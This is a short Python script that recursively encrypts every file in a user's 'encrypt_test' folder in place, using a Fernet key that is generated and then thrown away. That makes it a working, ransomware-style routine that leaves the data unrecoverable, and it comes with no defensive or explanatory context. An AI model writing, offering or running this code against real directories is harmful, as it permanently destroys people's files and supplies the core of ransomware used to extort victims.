import os
from cryptography.fernet import Fernet

def encrypt_folder(path):
    key = Fernet.generate_key()
    fer = Fernet(key)
    for root, dirs, files in os.walk(path):
        for file in files:
            with open(os.path.join(root, file), 'rb') as f:
                data = f.read()

            with open(os.path.join(root, file), 'wb') as f:
                print('Encrypting', os.path.abspath(f.name))
                f.write(fer.encrypt(data))

# Call the function
encrypt_folder("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin()))